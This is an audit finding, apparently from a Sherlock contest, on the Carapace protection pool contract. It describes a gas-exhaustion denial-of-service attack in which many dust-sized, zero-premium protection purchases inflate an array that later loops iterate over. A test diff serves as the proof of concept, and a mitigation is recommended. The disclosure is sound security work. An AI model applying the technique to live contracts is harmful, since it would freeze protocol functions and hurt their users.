libratus

high

# Attacker can DoS the contract by making many small protection purchases

## Summary
Attacker can cause "out of gas" exceptions due to loops over `activeProtectionIndexes`

## Vulnerability Detail
When locking capital after a default, the code goes through `activeProtectionIndexes` for the corresponding pool to calculate the amount of locked funds
https://github.com/sherlock-audit/2023-02-carapace/blob/main/contracts/core/pool/ProtectionPool.sol#L382-L406

The same array is being looped over when accruing premiums:
https://github.com/sherlock-audit/2023-02-carapace/blob/main/contracts/core/pool/ProtectionPool.sol#L975-L996

If the array has too many records these two methods will revert due to "out of gas".

Several implementation details allow an attacker to inflate the size of this array:
- Protection can be bought an unlimited number of times for the same loan. There is no check that prevents that https://github.com/sherlock-audit/2023-02-carapace/blob/main/contracts/core/pool/ReferenceLendingPools.sol#L132
- Due to rounding, premium value will be zero for dust protection amount https://github.com/sherlock-audit/2023-02-carapace/blob/main/contracts/core/PremiumCalculator.sol#L118-L121

Therefore, an attacker can buy many protections for the same loan, each being a fraction of 1 USDC. Cost of attack will only include gas fees.

## Impact
Attacker can brick locking capital and premium accrual. Cost of attack depends purely on gas fees

## Code Snippet
The following test case creates 100 protections while not spending any USDC on premium. Maximum premium parameter passed to `buyProtection` is 0)

```diff
diff --git a/test/contracts/ProtectionPool.test.ts b/test/contracts/ProtectionPool.test.ts
index 5309949..22bcc58 100644
--- a/test/contracts/ProtectionPool.test.ts
+++ b/test/contracts/ProtectionPool.test.ts
@@ -793,6 +793,42 @@ const testProtectionPool: Function = (
           ).to.be.revertedWith("PremiumExceedsMaxPremiumAmount"); // actual premium: 2186.178950
         });
 
+        it("...manages to buy many protections for zero premium", async () => {
+          const _initialBuyerAccountId: BigNumber = BigNumber.from(1);
+          const _protectionAmount = parseUSDC("0.000001");
+            _purchaseParams = {
+              lendingPoolAddress: _lendingPool2,
+              nftLpTokenId: 590,
+              protectionAmount: _protectionAmount,
+              protectionDurationInSeconds: getDaysInSeconds(40)
+            };
+
+            for (let i = 0; i < 100; i++) {
+              expect(
+                await protectionPool
+                  .connect(_protectionBuyer1)
+                  .buyProtection(_purchaseParams, parseUSDC("0"))
+              )
+                .emit(protectionPool, "PremiumAccrued")
+                .to.emit(protectionPool, "BuyerAccountCreated")
+                .withArgs(PROTECTION_BUYER1_ADDRESS, _initialBuyerAccountId)
+                .to.emit(protectionPool, "CoverageBought")
+                .withArgs(
+                  PROTECTION_BUYER1_ADDRESS,
+                  _lendingPool2,
+                  _protectionAmount
+                );
+            }
+
+            expect(
+              (
+                await protectionPool.getActiveProtections(
+                  PROTECTION_BUYER1_ADDRESS
+                )
+              ).length
+            ).to.eq(100);
+        });
+
         it("...1st buy protection is successful", async () => {
           const _initialBuyerAccountId: BigNumber = BigNumber.from(1);
           const _initialPremiumAmountOfAccount: BigNumber = BigNumber.from(0);

```

## Tool used

Manual Review

## Recommendation
Denying buying multiple protections for the same loan may be enough to prevent this. Goldfinch doesn't have a lot of investors per pool and so the number of protections bought for a pool will be limited to that number.